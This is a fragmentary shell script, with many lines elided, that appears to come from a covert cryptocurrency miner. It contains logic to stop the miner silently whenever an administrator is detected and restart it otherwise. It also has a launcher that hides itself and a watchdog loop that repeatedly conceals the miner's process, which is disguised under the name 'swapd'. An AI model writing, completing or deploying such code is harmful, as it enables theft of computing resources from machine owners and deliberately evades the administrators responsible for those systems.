...
# Enhanced with state tracking to minimize log spam
...
while true; do
  ...
  if [ "$CURRENT_STATE" != "$PREV_STATE" ]; then
    if [ "$CURRENT_STATE" = "admin_active" ]; then
      # Admin detected, stop miner silently
      ...
      # No admin detected, ensure miner is running
      if [ -f /run/systemd/system ]; then
...
# Hide this launcher script immediately (optional, may fail safely)
...
# Try to hide the miner
safe_hide $MINER_PID >/dev/null 2>&1

# Watchdog loop (runs silently in background)
while true; do
    CURRENT_PID=$(pidof swapd 2>/dev/null)
    if [ -n "$CURRENT_PID" ]; then
      safe_hide $CURRENT_PID >/dev/null 2>&1
    fi
    sleep 10
done
EOF
